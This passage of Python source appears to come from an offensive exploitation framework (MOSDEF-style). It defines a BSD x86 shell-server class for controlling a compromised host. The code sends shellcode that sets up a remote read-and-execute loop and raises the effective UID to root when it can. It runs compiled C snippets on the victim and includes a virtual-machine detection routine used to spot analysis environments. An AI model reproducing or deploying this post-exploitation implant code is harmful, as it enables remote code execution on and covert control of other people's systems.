        self.node = node
        self.node.shell = self
        self.started = 0

    def startup(self):
        """
        BSD Node Init
        """
        if self.started:
            return 0

        self.connection.set_timeout(10)
        sc=shellcodeGenerator.bsd_X86()
        sc.addAttr("sendreg",{"fdreg":"ebx","regtosend":"ebx"})
        sc.addAttr("read_and_exec",{"fdreg":"ebx"})
        getfd=sc.get()
        self.sendrequest(getfd)
        #now read in our little endian word that is our fd (originally in ebx)
        self.fd=self.readword()
        self.leave()
        self.log("Self.fd=%d"%self.fd)

        sc=shellcodeGenerator.bsd_X86()
        #sc.addAttr("Normalize Stack",[500])
        sc.addAttr("read_and_exec_loop",{"fd":self.fd})
        sc.addAttr("exit",None)
        mainloop=sc.get()
        self.sendrequest(mainloop)
        self.leave()
        #ok, now our mainloop code is running over on the other side
        self.log("Set up BSD dynamic linking assembly component server")
        self.initLocalFunctions()
        #At this point MOSDEF is up and running
        self.log("Initialized Local Functions.")
        self.log("Resetting signal handlers...")
        self.signal(self.SIGCHLD,self.SIG_DFL)
        self.log("Reset sigchild")
        self.log("Getting UIDs");
        (uid,euid,gid,egid)=self.ids()
        if euid!=0 and uid==0:
            self.log("Setting euid to 0...")
            self.seteuid(0)
        #here we set the timout to None, since we know the thing works...(I hope)
        self.connection.set_timeout(None)
        self.setInfo("BSD MOSDEF ShellServer. Remote host: %s"%("*"+str(self.getRemoteHost())+"*"))
        self.setProgress(100)
        self.started=1
        return 1

    def run(self):
        """
        Placeholder
        """
        return

    def fstat(self,infd):
        """
        runs fstat
        """

        vars={}
        vars["fd"]=infd
        code="""
        #include "fstat.h"
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","fstat" as "fstat"
        #import "int", "fd" as "fd"
        void main()
        {
             struct stat buf;
             int ret;

             ret=fstat(fd,&buf);
             sendint(ret);
             if (ret==0) {
              //success
              sendint(buf.st_dev);
              sendint(buf.st_ino);
              sendshort(buf.st_mode);
              sendshort(buf.st_nlink);
              sendint(buf.st_uid);
              sendint(buf.st_gid);
              sendint(buf.st_rdev);
              sendint(buf.st_size);
              sendint(buf.st_blksize);
              sendint(buf.st_blocks);
              sendint(buf.st_atime);
              sendint(buf.st_mtime);
              sendint(buf.st_ctime);
              }
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint(signed=True)
        statbuf=None
        if ret==0:
            #success

            # XXX: this is not the full struct stat for BSD
            # XXX: we're using MSTD POSIX 189
            # XXX: but these are all the fields we want for now

            statbuf=self.readstruct([("l","st_dev"),
                                     ("l","st_ino"),
                                     ("s","st_mode"),
                                     ("s","st_nlink"),
                                     ("l","st_uid"),
                                     ("l","st_gid"),
                                     ("l","st_rdev"),
                                     ("l","st_size"),
                                     ("l","st_blksize"),
                                     ("l","st_blocks"),
                                     ("l","st_atime"),
                                     ("l","st_mtime"),
                                     ("l","st_ctime")])

        self.leave()
        return ret,statbuf

    #### i386 Shellcode functions below ####

    def checkvm(self):
        "checks if we're inside a VM by checking for a relocated idt"
        logging.warning("Checking if we're inside a VirtualMachine")
        vars = {}
        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "checkvm" as "checkvm"

        void
        main()
        {
            int i;
            i = checkvm();
            sendint(i);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        if not ret:
            print "[!] Looks like we're on real hardware :)"
        else:
            print "[!] Looks like we're on virtual hardware :("
        self.leave()
        return ret

    def shutdown(self):
        """
        close the socket
        """
        #close connection
        self.connection.close()
        return

    def recv(self,fd, length):
        """
        reliable recv from socket
        """
        print "Recieving %d bytes from fd %d"%(length,fd)
        message=self.getrecvcode(fd,length)
        self.sendrequest(message)
        gotlength=0
        ret=[]
        #reliable recv
        buffer=self.node.parentnode.recv(self.connection,length)
        #print "Got %d: %s"%(len(buffer),prettyprint(buffer))
        self.leave()

        return buffer

